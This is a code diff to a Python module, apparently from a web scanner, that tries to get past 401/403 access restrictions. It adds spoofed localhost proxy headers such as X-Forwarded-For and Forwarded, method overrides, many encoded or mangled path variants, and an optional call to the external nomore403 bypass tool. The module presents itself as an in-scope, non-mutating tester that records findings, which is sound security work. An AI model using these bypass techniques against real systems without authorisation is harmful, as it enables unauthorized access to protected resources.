@@ -17,41 +17,59 @@ nothing changes state · and it only runs against hosts already in scope. Each
 confirmed bypass becomes a high-severity finding carrying the exact technique so
 an operator can reproduce it in one request.
 
-The technique catalogue mirrors the well-known open-source 403 bypass tools but
-is implemented natively so it has no external dependency and honours the scan's
-session (Tor proxy, UA, TLS settings) automatically.
+The technique catalogue is built from the well-known open-source 403 bypass
+repos · iamj0ker/bypass-403 (the "Joker" repo) and nomore403 · implemented
+natively so it has no hard dependency and honours the scan's session (Tor proxy,
+UA, TLS settings) automatically. When the external `nomore403` binary is present
+it is run as an additional, conservative second opinion and its confirmed hits
+are merged in (see _run_nomore403).
 """
 from __future__ import annotations
 
 import concurrent.futures
+import re
+import subprocess
 import time
 from urllib.parse import urlparse, urlunparse, quote
 
 from . import config
 from .schema import ScanResult
-from .util import get_logger, make_session, in_scope, host_of
+from .util import get_logger, make_session, in_scope, host_of, resolve_tool
 
 log = get_logger("bypass403")
 
 SRC = config.SOURCE_CODES["bypass"]          # "x"
 
 _LOCAL = "127.0.0.1"
-# Headers that a misconfigured proxy trusts to mean "internal / already authorised".
+# Headers that a misconfigured proxy trusts to mean "internal / already
+# authorised". The catalogue mirrors the well-known open-source 403 bypass tools
+# (iamj0ker/bypass-403 · the "Joker" repo · and nomore403), implemented natively
+# so it honours the scan session and needs no external binary.
 _BYPASS_HEADERS = [
     {"X-Forwarded-For": _LOCAL},
+    {"X-Forwarded-For": "127.0.0.1:80"},
+    {"X-Forwarded-For": "localhost"},
     {"X-Forwarded-Host": _LOCAL},
+    {"X-Forwarded-Proto": "http"},
+    {"X-Forwarded-Port": "80"},
+    {"X-Forwarded-Scheme": "http"},
+    {"X-Forwarded-Server": _LOCAL},
     {"X-Originating-IP": _LOCAL},
     {"X-Remote-IP": _LOCAL},
     {"X-Remote-Addr": _LOCAL},
     {"X-Client-IP": _LOCAL},
+    {"Client-IP": _LOCAL},
     {"True-Client-IP": _LOCAL},
     {"X-Real-IP": _LOCAL},
     {"X-Custom-IP-Authorization": _LOCAL},
-    {"X-Forwarded-Server": _LOCAL},
+    {"X-ProxyUser-Ip": _LOCAL},
     {"X-Host": _LOCAL},
-    {"X-Forwarded-Scheme": "http"},
+    {"X-Server-IP": _LOCAL},
+    {"Forwarded": f"for={_LOCAL};by={_LOCAL};host={_LOCAL}"},
+    {"X-HTTP-Method-Override": "GET"},
+    {"Content-Length": "0"},
 ]
-_SAFE_METHODS = ["HEAD", "OPTIONS"]
+_SAFE_METHODS = ["HEAD", "OPTIONS", "TRACE"]
 
 
 def _path_variants(path: str) -> list[str]:
@@ -66,21 +84,36 @@ def _path_variants(path: str) -> list[str]:
         "//" + p.lstrip("/"),
         base + "/.",
         base + "/./",
+        base + "/./.",
         p.replace(seg, "%2e" + seg, 1) if seg else p,
         base + "/%2e/",
+        base + "/%2e%2e/",
         base + "/..;/",
+        base + "/..%2f",
+        base + "/%2f",
+        base + "%2f",
+        base + "/%252e/",          # double-encoded dot
+        base + "/%252f",           # double-encoded slash
         base + ";/",
         base + "/;/",
+        base + ";foo=bar",         # matrix parameter
         base + "%20",
         base + "%09",
         base + "%00",
+        base + "%0a",
+        base + "%23",
         base + "?",
+        base + "??",
         base + "#",
+        base + "/*",
         base + ".json",
         base + ".html",
+        base + ".css",
         base + "/~",
-        base + "%2f",
+        base + "/.randomstring",   # trailing junk a prefix rule may not expect
+        p.upper() if p.lower() != p.upper() else p,
         (base[: -len(seg)] + seg.upper()) if seg and seg.lower() != seg.upper() else p,
+        (base[: -len(seg)] + seg.capitalize()) if seg and seg[:1].islower() else p,
     ]
     # de-dup, drop the identity
     seen, uniq = {path}, []
@@ -137,6 +170,39 @@ def _forbidden_targets(result: ScanResult) -> list[str]:
     return urls
 
 
+_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
+
+
+def _run_nomore403(url: str) -> list[dict]:
+    """Optional second opinion from the external nomore403 binary (the strong
+    open-source 403 bypass tool). Best-effort and conservative · only a clear 200
+    line that names the path is accepted, so a noisy table never fabricates a
+    bypass. Returns extra hits, or [] when the tool is absent or found nothing."""
+    binp = resolve_tool(config.NOMORE403_BIN)
+    if not binp:
+        return []
+    try:
+        proc = subprocess.run([binp, "-u", url], capture_output=True, text=True,
+                              timeout=max(60, config.HTTP_TIMEOUT * 6))
+    except Exception:
+        return []
+    text = _ANSI_RE.sub("", (proc.stdout or "") + "\n" + (proc.stderr or ""))
+    path = urlparse(url).path or "/"
+    hits: list[dict] = []
+    for line in text.splitlines():
+        s = line.strip()
+        # Accept only lines that clearly report a 200 and reference the target,
+        # never the 401/403 baseline lines.
+        if re.search(r"\b200\b", s) and ("http" in s.lower() or path in s) \
+                and "403" not in s and "401" not in s:
+            hits.append({"technique": "external tool (nomore403)", "method": "GET",
+                         "url": url, "status": 200, "length": None,
+                         "headers": {}, "evidence_line": s[:180]})
+        if len(hits) >= 5:
+            break
+    return hits
+
+
 def _probe(session, url: str) -> dict | None:
     """Confirm the URL is still forbidden, then try each bypass. Returns a result
     dict or None if the baseline is no longer 401/403 (nothing to bypass)."""
@@ -160,6 +226,11 @@ def _probe(session, url: str) -> dict | None:
             hits.append({"technique": technique, "method": method, "url": vurl,
                          "status": sc, "length": len(resp.content or b""),
                          "headers": headers})
+    # Optional external tool · merge its confirmed hits alongside the native ones.
+    try:
+        hits.extend(_run_nomore403(url))
+    except Exception:
+        pass
     if not hits:
         return None
     return {"url": url, "baseline": base.status_code, "baseline_len": base_len,
